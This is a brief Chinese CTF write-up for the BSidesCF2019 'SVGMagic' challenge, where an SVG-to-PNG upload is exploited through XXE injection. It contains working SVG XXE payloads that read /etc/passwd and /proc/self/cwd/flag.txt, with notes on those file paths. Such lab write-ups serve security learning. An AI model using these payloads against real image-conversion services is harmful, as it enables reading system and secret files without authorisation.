---
title: BSidesCF2019-SVGMagic
date: 2025-04-22 00:29:11
tags:
- xxe
- svg
category:
- 刷题笔记
---

# BSidesCF2019-SVGMagic

打开环境是一个svg转png的文件上传

参考：[浅谈SVG的两个黑魔法](https://www.sohu.com/a/434168767_99907709)

由SVG造成的XXE注入

模版

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
<!ENTITY file SYSTEM "file:///etc/passwd" >
]>
<svg height="200" width="1000">
  <text x="10" y="20">&file;</text>
</svg>
```

读取的话
/etc/passwd文件 系统用户配置文件，存储了系统中所有用户的基本信息
/proc/self 链接到当前正在运行的进程
/proc/self/cwd当前工作目录

这题可以读取/proc/self/cwd/flag.txt

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
<!ENTITY file SYSTEM "file:///proc/self/cwd/flag.txt" >
]>
<svg height="200" width="1000">
  <text x="10" y="20">&file;</text>
</svg>

```

上传之后成功拿到flag。
